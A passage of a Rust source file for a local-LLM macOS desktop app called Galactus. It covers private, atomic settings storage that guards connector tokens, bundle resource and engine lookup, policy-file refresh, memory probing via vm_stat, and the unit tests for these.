// Galactus desktop, Rust side.
//
// What is LEFT in this file: the settings store, hardware inspection, the model
// registry, pack resolution, the memory planner, and the llama-server
// lifecycle. In other words the engine and what it needs to be started
// correctly on a given Mac.
//
// What used to be here as well, and now sits beside it:
//
//   planner.rs        ce que ce Mac peut demarrer, et comment
//   documents.rs      PDF, Word, tableurs, images, OCR
//   install.rs        telecharger, profiler, planifier, empaqueter un modele
//   tools.rs          les outils de l'agent derriere le portail de permissions
//   library.rs        memoire, coffre Obsidian, skills, procedures apprises
//   conversations.rs  les fils sur le disque et la recherche dedans
//
// This file was 10 673 lines. Five of those six were already marked out by
// their own banner comment and came out on the banners. THREE LESSONS, each
// paid for once:
//
//   A banner says where a section STARTS, not what belongs to it.
//   `server_generation_tests` sat inside the documents banner and tests the
//   engine's generation counter; `folder_chooser_tests` sat inside the planner
//   range and chooses no plan. planner.rs was therefore cut by NAMING what
//   moves, not by cutting between two banners.
//
//   A test that reads its own source moves WITH the code it reads.
//   `memory_lock_tests` greps for the memory functions and followed them into
//   library.rs; `ctx_window_tests` followed kv_bytes_for into planner.rs.
//
//   Nothing here is verified by the fact that it compiles. Every move was
//   checked line by line against the committed file, normalising for the two
//   mechanical edits a split makes (visibility prefixes, module-qualified call
//   sites), until the only remaining differences were ones somebody meant.
//
// What is left is the engine itself: its statics, its generation counter, and
// the start and stop paths that share them. It is the one cluster that is
// genuinely stateful, which is why it stayed.

mod code;
mod conversations;
mod documents;
mod install;
mod library;
mod planner;
mod tools;
mod cron;
mod hardware;
mod knowledge;
mod lsp;
mod pty;
mod housekeeping;
mod image;
mod imgapi;
mod webm;
mod regexlite;
mod secaudit;
mod ssh;
mod relay;
mod pylang;
mod scheduler;
mod search;
mod snapshot;
mod symbols;
mod toolchain;
pub mod cli;

use serde::Serialize;
use serde_json::{json, Value};
use std::collections::HashMap;
use std::io::{BufRead, BufReader, Write as IoWrite};
use std::path::{Path, PathBuf};
use std::process::{Child, Command, Stdio};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::{Arc, Mutex, OnceLock};
use std::time::{Duration, Instant};
use tauri::{AppHandle, Emitter, Manager};

const SERVER_PORT_BASE: u16 = 8737;
const SERVER_PORT_SPAN: u16 = 40;

// ---------------------------------------------------------------- settings

/// Where the tests point the settings file, when they do.
///
/// WHY THIS EXISTS. The tests for this file used to define their own `parse()`
/// and assert on it, so `settings_read`, `settings_store` and `settings_update`
/// had no test at all: swapping the refusing read for `settings_load` inside
/// `settings_update`, which is the exact regression the comment above warns
/// about, left every test green while overwriting a file holding the user's
/// connector tokens. Compiled out of a release build, and never set outside a
/// test, so the shipped path is the one line below it.
#[cfg(test)]
fn settings_root_override() -> &'static Mutex<Option<PathBuf>> {
    static R: OnceLock<Mutex<Option<PathBuf>>> = OnceLock::new();
    R.get_or_init(|| Mutex::new(None))
}

fn settings_path() -> PathBuf {
    #[cfg(test)]
    {
        let over = settings_root_override().lock().unwrap_or_else(|e| e.into_inner());
        if let Some(dir) = over.as_ref() {
            return dir.join("settings.json");
        }
    }
    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
    PathBuf::from(home).join("Library/Application Support/Galactus/settings.json")
}

#[cfg(unix)]
fn set_private_mode(path: &Path, mode: u32) -> Result<(), String> {
    use std::os::unix::fs::PermissionsExt;
    let mut permissions = std::fs::metadata(path).map_err(|e| e.to_string())?.permissions();
    permissions.set_mode(mode);
    std::fs::set_permissions(path, permissions).map_err(|e| e.to_string())
}

#[cfg(not(unix))]
fn set_private_mode(_path: &Path, _mode: u32) -> Result<(), String> {
    Ok(())
}

/// settings.json contains connector credentials and standing permissions.
/// Protect the existing installation too, not only files created by this build.
fn harden_settings_permissions() -> Result<(), String> {
    let file = settings_path();
    if let Some(dir) = file.parent() {
        if dir.exists() {
            set_private_mode(dir, 0o700)?;
        }
    }
    if file.exists() {
        set_private_mode(&file, 0o600)?;
    }
    Ok(())
}

/// The settings, or an error saying the file exists and cannot be read.
///
/// The three cases are different and were all one. A file that is absent is an
/// empty map, which is correct on a first launch. A file that is present and
/// does not parse is NOT an empty map: it is a file with the user's Galactus
/// folder, their knowledge folders, their open tabs and every connector's
/// environment block, which is where their API tokens live. Reading it as empty
/// meant the next settings_update wrote a map containing one key and the rest
/// was gone, silently, on a launch that looked ordinary.
///
/// One badly typed value was enough: the map is `String -> String`, the file is
/// presented to the user as theirs, and `"memory_on": true` typed by hand fails
/// the whole deserialisation.
///
/// The scheduler already applies exactly this rule to jobs.json, with a comment
/// explaining it at length. It was not applied to the file holding the secrets.
fn settings_read() -> Result<HashMap<String, String>, String> {
    let path = settings_path();
    let raw = match std::fs::read_to_string(&path) {
        Ok(raw) => raw,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(HashMap::new()),
        Err(e) => return Err(format!("{}: {e}", path.display())),
    };
    if raw.trim().is_empty() {
        return Ok(HashMap::new());
    }
    serde_json::from_str(&raw).map_err(|e| {
        format!(
            "{} could not be read ({e}). Galactus will not overwrite it: move it aside to start \
             from scratch, or fix the line it names.",
            path.display()
        )
    })
}

/// The settings as a map, empty when the file cannot be read.
///
/// Kept for the many readers that have no way to report an error. Writers must
/// use `settings_update`, which refuses rather than overwriting.
fn settings_load() -> HashMap<String, String> {
    settings_read().unwrap_or_default()
}

fn settings_store(map: &HashMap<String, String>) -> Result<(), String> {
    let p = settings_path();
    if let Some(dir) = p.parent() {
        std::fs::create_dir_all(dir).map_err(|e| e.to_string())?;
        set_private_mode(dir, 0o700)?;
    }
    // Write-then-rename (atomic on APFS): a plain overwrite has a truncate
    // window during which a concurrent settings_load reads an empty map, and
    // the next store would then wipe every key.
    let tmp = p.with_extension(format!("tmp.{}", std::process::id()));
    let payload = serde_json::to_string_pretty(map).map_err(|e| e.to_string())?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        let mut file = std::fs::OpenOptions::new()
            .create(true)
            .truncate(true)
            .write(true)
            .mode(0o600)
            .open(&tmp)
            .map_err(|e| e.to_string())?;
        set_private_mode(&tmp, 0o600)?;
        file.write_all(payload.as_bytes()).map_err(|e| e.to_string())?;
        file.sync_all().map_err(|e| e.to_string())?;
    }
    #[cfg(not(unix))]
    std::fs::write(&tmp, payload).map_err(|e| e.to_string())?;
    std::fs::rename(&tmp, &p).map_err(|e| e.to_string())?;
    set_private_mode(&p, 0o600)
}

/// Serialized load-modify-store on the settings map. Several threads update
/// settings.json (install pipeline thread, main-thread commands, tokio
/// commands): without one lock two concurrent updates drop each other's keys.
pub(crate) fn settings_update<T>(f: impl FnOnce(&mut HashMap<String, String>) -> T) -> Result<T, String> {
    static SETTINGS_LOCK: Mutex<()> = Mutex::new(());
    let _guard = SETTINGS_LOCK.lock().unwrap_or_else(|e| e.into_inner());
    // Refuse rather than overwrite: this is the read-modify-write that would
    // destroy an unreadable file's contents.
    let mut map = settings_read()?;
    let out = f(&mut map);
    settings_store(&map)?;
    Ok(out)
}

/// The release notes shipped with this build, or an empty string.
///
/// Read from the bundle rather than fetched: someone who installed from a DMG
/// never saw a manifest, and after the restart that follows an in-app update
/// there is nothing left to ask. The file is written by prepare-engine.sh from
/// app/RELEASE-NOTES-v<version>.md.
#[tauri::command]
fn release_notes() -> String {
    resource_dir()
        .map(|r| r.join("packaged/release-notes.md"))
        .and_then(|p| std::fs::read_to_string(p).ok())
        .unwrap_or_default()
}

#[tauri::command]
fn settings_get() -> HashMap<String, String> {
    settings_load()
}

/// Settings the webview may not write.
///
/// `mcp` is a list of programs the app spawns, and `root` decides which
/// registry is read and which folder the app trusts. Either one written from
/// the page is arbitrary code execution with no dialog in front of it. The
/// content security policy makes that hard to reach, and this is the layer that
/// makes it pointless: they have their own commands, which validate.
const PROTECTED_SETTINGS: &[&str] = &["mcp", "root"];

#[tauri::command]
fn settings_set(key: String, value: String) -> Result<(), String> {
    if PROTECTED_SETTINGS.contains(&key.as_str()) {
        return Err(format!("{key} is not set this way"));
    }
    settings_update(|map| {
        map.insert(key, value);
    })
}

/// Write the connector configuration, after checking it is one.
///
/// `settings_set` refuses this key, so this is the only way in, and the shape
/// is verified here rather than at spawn time: every string that reaches
/// Command comes out of this blob.
#[tauri::command]
fn mcp_config_set(config: String) -> Result<(), String> {
    let parsed: Value = serde_json::from_str(&config).map_err(|e| format!("connectors: {e}"))?;
    let servers = parsed
        .get("mcpServers")
        .and_then(|v| v.as_object())
        .ok_or("connectors: expected an mcpServers object")?;
    for (name, cfg) in servers {
        if name.is_empty() || name.contains(char::is_whitespace) {
            return Err(format!("connectors: {name:?} is not a usable name"));
        }
        let command = cfg.get("command").and_then(|v| v.as_str()).unwrap_or_default();
        if command.is_empty() || command.contains('\n') {
            return Err(format!("connectors: {name} has no usable command"));
        }
        if let Some(args) = cfg.get("args") {
            let list = args.as_array().ok_or("connectors: args must be a list")?;
            if list.iter().any(|a| !a.is_string()) {
                return Err("connectors: every argument must be text".into());
            }
        }
        if let Some(env) = cfg.get("env") {
            let map = env.as_object().ok_or("connectors: env must be an object")?;
            if map.values().any(|v| !v.is_string()) {
                return Err("connectors: every environment value must be text".into());
            }
        }
    }
    settings_update(|map| {
        map.insert("mcp".to_string(), config);
    })
}

/// Point the app at a Galactus folder, after checking it is a folder.
#[tauri::command]
fn root_set(path: String) -> Result<(), String> {
    let p = std::fs::canonicalize(&path).map_err(|e| format!("{path}: {e}"))?;
    if !p.is_dir() {
        return Err(format!("{path} is not a folder"));
    }
    settings_update(|map| {
        map.insert("root".to_string(), p.to_string_lossy().to_string());
    })
}

#[cfg(test)]
mod cache_ceiling_tests {
    use super::*;

    /// If perf can start, eco must be able to start.
    ///
    /// That is what the three modes mean: eco is the smallest footprint, perf
    /// the largest. The registry entry that broke it has ONE measured point, a
    /// 92 GB cache taken on a machine far bigger than the one being planned
    /// for, and eco returned that number unclamped. So eco asked for MORE than
    /// perf, the step-down from perf walked toward a heavier footprint, and
    /// every mode came back impossible, on a card the app had shown as
    /// installable after a 202 GB download.
    ///
    /// Stated as an invariant between modes rather than as a number, because
    /// the numbers depend on the machine and the invariant does not.
    #[test]
    fn eco_is_never_heavier_than_perf() {
        let entry = json!({
            "id": "single-point",
            "gguf_bytes": 60_000_000_000u64,
            "expert_bytes_total": 50_000_000_000u64,
            "non_expert_bytes": 4_000_000_000u64,
            "record_bytes": 13_000_000u64,
            "experts": 128,
            "experts_used": 8,
            "layers_moe": 40,
            "min_cache_bytes": 5_000_000_000u64,
            "status": "certified_bit_transparent",
            // The only measurement comes from a much larger machine.
            "measured": [{"cache_gb": 92.0, "gen_tps": 6.0, "mac_gb": 512}],
        });
        for ram in [32u64, 64, 128] {
            let machine = MachineLimits { ram_gb: ram, available: None, gpu_working_set: None };
            let perf = crate::planner::plan_cache(&entry, machine, None, "perf", false, 1, CTX_PER_SLOT);
            let eco = crate::planner::plan_cache(&entry, machine, None, "eco", false, 1, CTX_PER_SLOT);
            if let Ok(p) = perf {
                let e = eco.unwrap_or_else(|err| {
                    panic!("{ram} GB: perf planned {} but eco refused: {err}", p.cache_bytes)
                });
                assert!(
                    e.cache_bytes <= p.cache_bytes,
                    "{ram} GB: eco planned {} against perf's {}",
                    e.cache_bytes,
                    p.cache_bytes
                );
            }
        }
    }
}

#[cfg(test)]
mod settings_read_tests {
    use super::*;

    /// One test at a time: the override and the file are process-wide.
    fn settings_lock() -> std::sync::MutexGuard<'static, ()> {
        static L: OnceLock<Mutex<()>> = OnceLock::new();
        L.get_or_init(|| Mutex::new(()))
            .lock()
            .unwrap_or_else(|e| e.into_inner())
    }

    /// A scratch folder that IS the settings folder for the duration.
    struct Scratch {
        dir: PathBuf,
        _guard: std::sync::MutexGuard<'static, ()>,
    }

    impl Scratch {
        fn new(name: &str) -> Scratch {
            let guard = settings_lock();
            let dir = std::env::temp_dir()
                .join(format!("galactus-set-{}-{name}", std::process::id()));
            let _ = std::fs::remove_dir_all(&dir);
            std::fs::create_dir_all(&dir).unwrap();
            *settings_root_override().lock().unwrap_or_else(|e| e.into_inner()) =
                Some(dir.clone());
            Scratch { dir, _guard: guard }
        }

        fn file(&self) -> PathBuf {
            self.dir.join("settings.json")
        }
    }

    impl Drop for Scratch {
        fn drop(&mut self) {
            *settings_root_override().lock().unwrap_or_else(|e| e.into_inner()) = None;
            let _ = std::fs::remove_dir_all(&self.dir);
        }
    }

    #[test]
    fn absent_is_empty_but_unreadable_is_an_error() {
        // The distinction that matters: one is a first launch, the other is a
        // file holding the user's tokens. Asserted on `settings_read` itself.
        let s = Scratch::new("read");
        assert!(settings_read().unwrap().is_empty(), "no file is a first launch");
        std::fs::write(s.file(), "   ").unwrap();
        assert!(settings_read().unwrap().is_empty(), "an empty file is not a failure");
        std::fs::write(s.file(), "{\"root\": \"/tmp\"}").unwrap();
        assert_eq!(settings_read().unwrap().get("root").map(String::as_str), Some("/tmp"));
        for bad in ["{\"root\": ", "{\"memory_on\": true}", "not json at all"] {
            std::fs::write(s.file(), bad).unwrap();
            assert!(settings_read().is_err(), "should refuse: {bad}");
        }
    }

    /// An update on top of an unreadable file refuses and changes nothing.
    ///
    /// This is the one that was never covered, and the one that costs the most:
    /// the read-modify-write in `settings_update` is what would turn a file
    /// with one bad line into an empty object with the user's tokens gone.
    #[test]
    fn an_update_over_an_unreadable_file_refuses_and_keeps_the_bytes() {
        let s = Scratch::new("keep");
        std::fs::write(s.file(), "{\"root\": \"/tmp\", ").unwrap();
        let before = std::fs::read(s.file()).unwrap();
        let out = settings_update(|m| {
            m.insert("root".into(), "/elsewhere".into());
        });
        assert!(out.is_err(), "an unreadable file must not be updated");
        assert_eq!(std::fs::read(s.file()).unwrap(), before, "the bytes must survive");
    }

    /// A normal update round trips, and does it without a truncate window.
    #[test]
    fn an_update_writes_atomically_and_reads_back() {
        let s = Scratch::new("write");
        settings_update(|m| {
            m.insert("root".into(), "/tmp/work".into());
        })
        .expect("first write");
        settings_update(|m| {
            m.insert("theme".into(), "dark".into());
        })
        .expect("second write");
        let back = settings_read().expect("read");
        assert_eq!(back.get("root").map(String::as_str), Some("/tmp/work"));
        assert_eq!(back.get("theme").map(String::as_str), Some("dark"), "keys must not be dropped");
        // Write-then-rename leaves nothing behind: a temp file still sitting
        // there means the rename half of the pair was lost in a refactor.
        // Only OUR temporaries: this folder is also app_support() while the
        // override is set, so anything else in the process may put a directory
        // here, and that is not what this test is about.
        let leftovers: Vec<String> = std::fs::read_dir(&s.dir)
            .unwrap()
            .flatten()
            .map(|e| e.file_name().to_string_lossy().to_string())
            .filter(|n| n.starts_with("settings.json.tmp"))
            .collect();
        assert!(leftovers.is_empty(), "write-then-rename left its temporary: {leftovers:?}");
    }

    /// The file the user's tokens live in is readable by nobody else.
    #[cfg(unix)]
    #[test]
    fn the_written_file_is_private() {
        use std::os::unix::fs::PermissionsExt;
        let s = Scratch::new("mode");
        settings_update(|m| {
            m.insert("token".into(), "secret".into());
        })
        .expect("write");
        let mode = std::fs::metadata(s.file()).unwrap().permissions().mode() & 0o777;
        assert_eq!(mode, 0o600, "settings.json must stay owner-only");
        let dir_mode = std::fs::metadata(&s.dir).unwrap().permissions().mode() & 0o777;
        assert_eq!(dir_mode, 0o700, "the folder around it too");
    }
}

#[cfg(all(test, unix))]
mod settings_permission_tests {
    use super::*;
    use std::os::unix::fs::PermissionsExt;
    use std::time::{SystemTime, UNIX_EPOCH};

    #[test]
    fn private_modes_remove_group_and_world_access() {
        let unique = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let dir = std::env::temp_dir().join(format!(
            "galactus-settings-mode-{}-{unique}",
            std::process::id()
        ));
        std::fs::create_dir_all(&dir).unwrap();
        let file = dir.join("settings.json");
        std::fs::write(&file, "{}").unwrap();

        set_private_mode(&dir, 0o700).unwrap();
        set_private_mode(&file, 0o600).unwrap();

        assert_eq!(std::fs::metadata(&dir).unwrap().permissions().mode() & 0o777, 0o700);
        assert_eq!(std::fs::metadata(&file).unwrap().permissions().mode() & 0o777, 0o600);
        let _ = std::fs::remove_dir_all(dir);
    }
}

pub(crate) fn galactus_root() -> Result<PathBuf, String> {
    let map = settings_load();
    if let Some(root) = map.get("root").cloned().filter(|s| !s.is_empty()) {
        let p = PathBuf::from(root);
        if p.join("scripts/models-registry.json").exists() {
            // The refresh used to live inside provision_default_root, which
            // only runs when NO root is configured. Every user who had ever
            // launched an older build had one, so the branch that keeps the
            // catalogue current was exactly the branch they never took: their
            // model list was frozen at whatever shipped with their first
            // install, and two new certified models were invisible to them.
            // Once per process: this is called on nearly every command.
            static ONCE: std::sync::Once = std::sync::Once::new();
            ONCE.call_once(|| {
                if !root_is_a_checkout(&p) {
                    let _ = refresh_policy_files(&p);
                }
            });
            return Ok(p);
        }
    }
    // No (valid) checkout configured: run self-contained on the bundled data.
    provision_default_root()
}

/// Bundle Resources dir (packaged app) or src-tauri (dev run).
pub(crate) fn swift_helper(name: &str) -> Result<PathBuf, String> {
    // Precompiled helper shipped in the bundle: works on Macs without the
    // Command Line Tools (no swiftc needed at runtime).
    if let Some(res) = resource_dir() {
        let prebuilt = res.join("packaged").join(name);
        if prebuilt.is_file() {
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                if let Ok(meta) = std::fs::metadata(&prebuilt) {
                    let mut perm = meta.permissions();
                    if perm.mode() & 0o111 == 0 {
                        perm.set_mode(0o755);
                        let _ = std::fs::set_permissions(&prebuilt, perm);
                    }
                }
            }
            return Ok(prebuilt);
        }
    }
    let bin = app_support().join(name);
    let src_candidates = [
        std::env::current_dir()
            .unwrap_or_default()
            .join(format!("src-tauri/helpers/{name}.swift")),
        // Packaged app: the helper ships as a bundle resource
        // (Contents/MacOS/<exe> → Contents/Resources/helpers/…).
        std::env::current_exe()
            .ok()
            .and_then(|p| {
                p.parent()
                    .and_then(|d| d.parent())
                    .map(|d| d.join(format!("Resources/helpers/{name}.swift")))
            })
            .unwrap_or_default(),
        std::env::current_exe()
            .ok()
            .and_then(|p| p.parent().map(|d| d.join(format!("helpers/{name}.swift"))))
            .unwrap_or_default(),
        galactus_root()
            .map(|r| r.join(format!("app/src-tauri/helpers/{name}.swift")))
            .unwrap_or_default(),
    ];
    let src = src_candidates
        .iter()
        .find(|p| p.is_file())
        .cloned()
        .ok_or_else(|| format!("helper source not found: app/src-tauri/helpers/{name}.swift"))?;

    // Rebuild when the source is newer than the cached binary.
    let stale = match (std::fs::metadata(&bin), std::fs::metadata(&src)) {
        (Ok(b), Ok(s)) => match (b.modified(), s.modified()) {
            (Ok(bt), Ok(st)) => bt < st,
            _ => false,
        },
        _ => true,
    };
    if !bin.is_file() || stale {
        std::fs::create_dir_all(app_support()).map_err(|e| e.to_string())?;
        let out = Command::new("swiftc")
            .args(["-O", "-o"])
            .arg(&bin)
            .arg(&src)
            .output()
            .map_err(|e| format!("swiftc unavailable ({e}). Install Xcode Command Line Tools: xcode-select --install"))?;
        if !out.status.success() {
            return Err(format!(
                "{name} failed to build: {}",
                String::from_utf8_lossy(&out.stderr)
                    .lines()
                    .take(6)
                    .collect::<Vec<_>>()
                    .join(" | ")
            ));
        }
    }
    Ok(bin)
}

pub(crate) fn resource_dir() -> Option<PathBuf> {
    if let Ok(exe) = std::env::current_exe() {
        if let Some(res) = exe
            .parent()
            .and_then(|p| p.parent())
            .map(|p| p.join("Resources"))
        {
            if res.join("engine/llama-server").exists() || res.join("packaged").exists() {
                return Some(res);
            }
        }
    }
    let dev = std::env::current_dir().unwrap_or_default().join("src-tauri");
    if dev.join("engine").exists() || dev.join("packaged").exists() {
        return Some(dev);
    }
    None
}

/// The llama-server shipped inside the app bundle (fully relocated: dylibs
/// and OpenSSL travel with it). Returns None when the app was built without
/// an engine (dev builds before prepare-engine.sh).
fn bundled_engine() -> Option<PathBuf> {
    let bin = resource_dir()?.join("engine/llama-server");
    if !bin.is_file() {
        return None;
    }
    // Resource copying does not guarantee the executable bit.
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        if let Ok(meta) = std::fs::metadata(&bin) {
            let mut perm = meta.permissions();
            if perm.mode() & 0o111 == 0 {
                perm.set_mode(0o755);
                let _ = std::fs::set_permissions(&bin, perm);
            }
        }
    }
    Some(bin)
}

/// The isolated Python runtime shipped in the bundle. A virgin macOS has no
/// /usr/bin/python3 (it is a Command Line Tools shim that pops an install
/// dialog): the app must never depend on it.
/// rust-analyzer embarque, et les sources de la bibliotheque standard qui vont
/// avec. Retourne le binaire et la racine des sources, ou None si l'outillage
/// n'a pas ete embarque a la construction.
///
/// Le serveur seul resout la navigation a l'interieur du projet mais pas
/// `std::` : sans sysroot il signale des erreurs partout. Les sources
/// suffisent, le toolchain complet (1,2 Go) n'a pas a etre livre. Si l'utilisateur
/// a rustup, rust-analyzer utilisera en plus `cargo metadata` pour resoudre
/// les dependances de son projet, ce que les sources seules ne donnent pas.
pub(crate) fn bundled_rust_analyzer() -> Option<(PathBuf, PathBuf)> {
    let root = resource_dir()?.join("rust-tooling");
    let bin = root.join("rust-analyzer");
    let src = root.join("rust-src/library");
    if bin.is_file() && src.is_dir() {
        Some((bin, src))
    } else {
        None
    }
}

/// Chemin du serveur et de son sysroot, pour la vue Code. Expose au frontend
/// afin que le badge de niveau dise la verite : Rust passe au niveau complet
/// seulement si les deux sont reellement presents.
#[tauri::command]
fn rust_analyzer_paths() -> Option<(String, String)> {
    bundled_rust_analyzer()
        .map(|(b, s)| (b.display().to_string(), s.display().to_string()))
}

fn bundled_python() -> Option<PathBuf> {
    let bin = resource_dir()?.join("python/bin/python3");
    if bin.is_file() {
        Some(bin)
    } else {
        None
    }
}

/// A ready-to-use python3 invocation: bundled interpreter in isolated mode
/// (-I: ignores PYTHON* env vars and user site-packages, a local sandbox),
/// falling back to the system python3 for developer checkouts.
pub(crate) fn python3_cmd() -> Command {
    match bundled_python() {
        Some(bin) => {
            let mut c = Command::new(bin);
            c.arg("-I");
            c
        }
        None => Command::new("python3"),
    }
}

/// Self-contained mode: data lives in Application Support/Galactus/data,
/// seeded from the registry and scripts bundled with the app. No checkout,
/// no third-party install: plug and play.
fn provision_default_root() -> Result<PathBuf, String> {
    // Once per process, like the configured-root branch already does.
    //
    // This is the DEFAULT path, taken by every plug-and-play install, and it
    // re-copied four files on every call: the registry plus three Python
    // scripts, so about fifty kilobytes of copy-and-rename. galactus_root() is
    // called by hw_info, registry_entry, measured_geometry (so by every
    // plan_cache), load_registry and list_volumes; painting the Models page
    // runs a recommendation for each of twelve models, each of which plans
    // twice. That is hundreds of file copies for one screen.
    static PROVISIONED: OnceLock<Result<PathBuf, String>> = OnceLock::new();
    PROVISIONED.get_or_init(provision_default_root_once).clone()
}

fn provision_default_root_once() -> Result<PathBuf, String> {
    let root = app_support().join("data");
    let scripts = root.join("scripts");
    std::fs::create_dir_all(&scripts).map_err(|e| e.to_string())?;
    std::fs::create_dir_all(root.join("models")).map_err(|e| e.to_string())?;
    std::fs::create_dir_all(root.join("artifacts/h4/packs")).map_err(|e| e.to_string())?;
    let res = resource_dir()
        .ok_or("Galactus folder is not set and the app bundle carries no packaged data")?;
    let _ = res;
    refresh_policy_files(&root)?;
    Ok(root)
}

/// The files that belong to the application rather than to the user.
///
/// The catalogue, the profiler and the two pack scripts are policy and
/// implementation: an upgraded app must not keep running the registry, the
/// hardware floor or the installer that shipped with its FIRST installation.
///
/// Copy then rename, so a launch interrupted halfway leaves the previous file
/// whole rather than a truncated one.
fn refresh_policy_files(root: &Path) -> Result<(), String> {
    let res = resource_dir()
        .ok_or("Galactus folder is not set and the app bundle carries no packaged data")?;
    let src = res.join("packaged/scripts");
    let scripts = root.join("scripts");
    std::fs::create_dir_all(&scripts).map_err(|e| e.to_string())?;
    for f in [
        "models-registry.json",
        // Without this the Images view is dead on every machine but a
        // checkout: load_registry reads it from the root, and a provisioned
        // root only ever holds what this list puts there.
        "image-models.json",
        "moe-profile.py",
        "galactus-pack-plan.py",
        "galactus-pack-write.py",
    ] {
        let destination = scripts.join(f);
        let temporary = scripts.join(format!(".{f}.new"));
        std::fs::copy(src.join(f), &temporary).map_err(|e| format!("refresh {f}: {e}"))?;
        std::fs::rename(&temporary, &destination).map_err(|e| format!("activate {f}: {e}"))?;
    }
    Ok(())
}

#[cfg(test)]
mod packaged_files_tests {
    /// Every file the app installs into a provisioned root must actually be in
    /// the bundle.
    ///
    /// This is the test that would have caught image-models.json: the Rust list
    /// said to install it, the build script never copied it, and the Images view
    /// was therefore dead on every machine except a git checkout, where the file
    /// happens to be there already. Two lists in two languages, and nothing
    /// compared them.
    #[test]
    fn the_build_script_bundles_every_policy_file_the_app_installs() {
        let here = std::path::Path::new(env!("CARGO_MANIFEST_DIR"));
        let rust = std::fs::read_to_string(here.join("src/lib.rs")).expect("lib.rs");
        let shell = std::fs::read_to_string(here.join("prepare-engine.sh")).expect("prepare-engine.sh");

        // The list inside refresh_policy_files.
        let start = rust.find("fn refresh_policy_files").expect("refresh_policy_files");
        let block = &rust[start..start + 1200];
        let wanted: Vec<&str> = block
            .lines()
            .filter_map(|l| l.trim().strip_prefix('"'))
            .filter_map(|l| l.split('"').next())
            .filter(|f| f.contains('.'))
            .collect();
        assert!(wanted.contains(&"models-registry.json"), "the list was not found: {wanted:?}");
        assert!(
            wanted.contains(&"image-models.json"),
            "the image registry must be installed into a provisioned root"
        );

        // The copy loop in the build script.
        let line = shell
            .lines()
            .find(|l| l.trim_start().starts_with("for f in models-registry.json"))
            .expect("the copy loop");
        for f in &wanted {
            assert!(
                line.contains(f),
                "{f} is installed by the app but never copied into the bundle by prepare-engine.sh"
            );
        }
    }
}

/// Whether this root is one the app may overwrite policy files inside.
///
/// A checkout is somebody's working tree: its registry is edited, measured into
/// and committed, and an app that copied its bundled copy over it would destroy
/// work between two launches. A provisioned folder, or any plain folder a user
/// pointed the app at, holds no such history and must be kept current.
///
/// The test is the presence of a `.git` entry, not a guess from the path. It is
/// a file as well as a directory: a worktree carries `.git` as a file.
fn root_is_a_checkout(root: &Path) -> bool {
    root.join(".git").exists()
}

// ---------------------------------------------------------------- hardware

#[derive(Serialize, Clone)]
struct HwInfo {
    chip: String,
    cores: u32,
    ram_gb: u64,
    disk_free_gb: u64,
    /// GPU cores, from ioreg. `None` on Intel or in a VM.
    gpu_cores: Option<u32>,
    /// The CPU tiers, fastest first, named as macOS names them. Never a name
    /// this code invented: see `hardware::read_core_levels`.
    core_levels: Vec<hardware::CoreLevel>,
    /// `MTLDevice.recommendedMaxWorkingSetSize`: the unified memory this GPU
    /// may keep resident. `None` when there is no Metal device.
    gpu_working_set_bytes: Option<u64>,
    /// Apple's published memory bandwidth for this chip, GB/s. `None` for any
    /// chip released after this build. Shown, never used to decide.
    bandwidth_gbs: Option<f64>,
    /// What the engine may hold in total RIGHT NOW: the tightest of the four
    /// bounds. This is the number a user needs to understand any refusal, and
    /// it is the one the app never showed.
    engine_budget_bytes: u64,
    /// Live, and the reason `hw_info` is worth calling more than once.
    power_source: hardware::PowerSource,
    power_mode: hardware::PowerMode,
}

fn run_capture(cmd: &str, args: &[&str]) -> String {
    Command::new(cmd)
        .args(args)
        .output()
        .ok()
        .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
        .unwrap_or_default()
}

// Async so the probe (df on a possibly sleeping external volume) runs off the
// main thread; the sync impl stays for internal and CLI callers.
#[tauri::command]
async fn hw_info() -> HwInfo {
    hw_info_impl()
}

/// Memory this Mac can actually hand over right now, not the memory it was sold
/// with.
///
/// The planner budgeted against `hw.memsize` and subtracted a fixed reserve for
/// "macOS and whatever the user is doing". That reserve is a guess about
/// somebody else's machine: it was right on the machine this was written on and
/// wrong on a colleague's 24 GB Mac with a browser open, where the engine came
/// back with "Compute error." and nothing pointing at memory.
///
/// Free plus inactive plus speculative, because macOS counts as inactive the
/// pages it will hand over without hesitating, and counting only `free` would
/// make a healthy Mac look full. Purgeable is deliberately NOT counted: it is
/// reclaimable, but reclaiming it costs the app that owns it.
///
/// Returns None when vm_stat cannot be read or parsed, and the caller then
/// falls back to the installed-RAM budget: a missing measurement must not make
/// the planner refuse everything.
fn available_memory_bytes() -> Option<u64> {
    let out = run_capture("vm_stat", &[]);
    if out.is_empty() {
        return None;
    }
    let mut page = 0u64;
    if let Some(i) = out.find("page size of ") {
        page = out[i + 13..]
            .split_whitespace()
            .next()
            .and_then(|s| s.parse().ok())
            .unwrap_or(0);
    }
    if page == 0 {
        return None;
    }
    let mut pages = 0u64;
    let mut seen = 0;
    for line in out.lines() {
        let want = line.starts_with("Pages free:")
            || line.starts_with("Pages inactive:")
            || line.starts_with("Pages speculative:");
        if !want {
            continue;
        }
        if let Some(v) = line.rsplit(':').next() {
            if let Ok(n) = v.trim().trim_end_matches('.').parse::<u64>() {
                pages += n;
                seen += 1;
            }
        }
    }
    if seen == 0 {
        return None;
    }
    Some(pages.saturating_mul(page))
}

#[cfg(test)]
mod available_memory_tests {
    use super::available_memory_bytes;

    #[test]
    fn it_reads_a_plausible_figure_from_this_machine() {
        // Not a fixed value: the point is that it parses vm_stat and lands in a
        // range no parsing bug would land in. A misread page size or a dropped
        // decimal point leaves this by orders of magnitude.
        let got = available_memory_bytes().expect("vm_stat is readable on macOS");
        assert!(got > 100_000_000, "suspiciously small: {got}");
        assert!(got < 2_000_000_000_000, "suspiciously large: {got}");
    }
}

fn hw_info_impl() -> HwInfo {
    // The static half is read once per process and cached: the chip, the
    // cores, the soldered memory and the Metal limits do not move while the
    // app runs. About 30 ms the first time, nothing after.
    let profile = hardware::static_profile();
    let base = galactus_root()
        .map(|p| p.to_string_lossy().into_owned())
        .unwrap_or_else(|_| "/".into());
    let df = run_capture("df", &["-g", &base]);
    let disk_free_gb: u64 = df
        .lines()
        .nth(1)
